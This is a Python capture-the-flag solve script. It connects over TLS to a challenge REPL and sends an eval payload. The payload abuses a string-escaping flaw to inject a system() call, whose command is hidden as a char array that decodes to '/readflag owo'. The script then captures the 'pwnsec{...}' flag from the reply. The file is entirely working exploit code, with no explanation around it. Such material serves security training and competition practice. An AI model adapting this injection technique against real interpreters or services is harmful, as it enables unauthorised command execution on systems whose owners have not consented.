import json
import re
import socket
import ssl
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(rb"pwnsec\{[^}\r\n]+\}")
SOURCE = (
    r'let m = {x: 1}; print(m."x\x22); '
    r'system((char[]){47,114,101,97,100,102,108,97,103,32,111,119,111,0}); '
    r'y_map_get(_m,\x22x");'
)


def main() -> int:
    config = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = config["endpoints"][0]
    raw = socket.create_connection((endpoint["host"], endpoint["port"]), timeout=15)
    with ssl.create_default_context().wrap_socket(
        raw, server_hostname=endpoint["host"]
    ) as sock:
        sock.settimeout(15)
        received = b""
        while b"y> " not in received:
            received += sock.recv(4096)

        sock.sendall(("eval " + SOURCE + "\n").encode())
        received = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            received += chunk
            match = FLAG_RE.search(received)
            if match:
                sys.stdout.buffer.write(match.group(0))
                return 0
            if b"y> " in received:
                break
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
